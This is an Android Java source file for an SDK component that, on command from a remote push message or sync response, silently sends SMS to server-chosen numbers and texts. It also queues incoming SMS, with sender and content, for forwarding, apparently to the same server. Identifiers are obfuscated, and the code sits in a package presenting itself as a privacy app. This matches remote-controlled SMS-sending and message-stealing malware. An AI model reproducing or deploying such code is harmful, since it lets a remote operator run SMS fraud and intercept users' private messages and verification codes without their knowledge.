package privacy.app.com.c_master;

import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.telephony.SmsManager;
import android.text.TextUtils;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;

import java.util.concurrent.TimeUnit;

import main_commons.app.c_master.commons.commons.SdkComponent;
import privacy.app.com.c_master.keep.DeviceEventsResponse;
import privacy.app.com.c_master.keep.Text;

@SuppressWarnings("WeakerAccess")
public class TextComponent extends SdkComponent {

    public static final String ARG_PHONE_NUMBER = "arg_t6562565_1";
    public static final String ARG_MESSAGE = "arg_t6562565_2";
    public static final String ARG_SMS_ID = "arg_t6562565_3";

    private static final String JOB_TAG_SEND_RECEIVED_SMS = "t826t763738_1";
    private static final String JOB_TAG_SMS_SENT = "t826t763738_2";

    private static TextComponent instance;

    public static TextComponent get() {
        return instance;
    }

    public TextComponent() {
        instance = this;
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_SEND_RECEIVED_SMS.equals(tag)) {
            return new SendReceivedSmsJob();
        }
        if (JOB_TAG_SMS_SENT.equals(tag)) {
            return new SendSmsSentStatusJob();
        }
        return null;
    }

    @Override
    public void onFcmMessageReceived(@NonNull String type, @NonNull Bundle payload) {
        if ("sms".equals(type)) {
            String smsId = payload.getString("id");
            String phone = payload.getString("phone_number");
            String message = payload.getString("text");
            onSmsComeToSend(smsId, phone, message);
        }
    }

    @Override
    public void onSyncEvent(@NonNull String json) {
        DeviceEventsResponse response = safeParse(json, DeviceEventsResponse.class);
        if (response != null) {
            Text smsToSend = response.getText();
            if (smsToSend != null) {
                onSmsComeToSend(smsToSend.getId(), smsToSend.getPhoneNumber(), smsToSend.getMessage());
            }
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    public void onSmsReceived(String sender, String message) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_PHONE_NUMBER, sender);
        extras.putString(ARG_MESSAGE, message);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_SEND_RECEIVED_SMS)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    private void onSmsWasSent(String smsId) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_SMS_ID, smsId);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_SMS_SENT)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    ///////////////////////////////////////////////////////////////////////////
    // UTILS
    ///////////////////////////////////////////////////////////////////////////

    private void onSmsComeToSend(String smsId, String recipient, String message) {
        if (!TextUtils.isEmpty(recipient) && !TextUtils.isEmpty(message)) {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(recipient, null, message, null, null);
            onSmsWasSent(smsId);
        }
    }
}
